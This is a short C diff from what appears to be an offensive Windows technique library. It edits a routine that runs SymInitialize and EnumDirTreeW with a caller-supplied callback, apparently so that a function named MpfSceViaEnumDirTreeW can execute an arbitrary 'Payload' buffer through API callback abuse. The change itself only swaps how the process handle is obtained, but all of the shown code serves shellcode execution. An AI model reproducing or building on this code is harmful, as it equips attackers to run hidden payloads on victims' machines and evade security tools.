@@ -4,12 +4,12 @@ VOID InvokeEnumDirTreeWThreadCallbackRoutine(LPVOID lpParameter)
 {
 	WCHAR DisposeableBuffer[512] = { 0 };
 
-	if (!SymInitialize(InlineGetCurrentProcess, NULL, TRUE))
+	if (!SymInitialize(GetCurrentProcessNoForward(), NULL, TRUE))
 		return;
 
-	EnumDirTreeW(InlineGetCurrentProcess, L"C:\\Windows", L"*.log", DisposeableBuffer, (PENUMDIRTREE_CALLBACKW)lpParameter, NULL);
+	EnumDirTreeW(GetCurrentProcessNoForward(), L"C:\\Windows", L"*.log", DisposeableBuffer, (PENUMDIRTREE_CALLBACKW)lpParameter, NULL);
 
-	SymCleanup(InlineGetCurrentProcess);
+	SymCleanup(GetCurrentProcessNoForward());
 }
 
 BOOL MpfSceViaEnumDirTreeW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
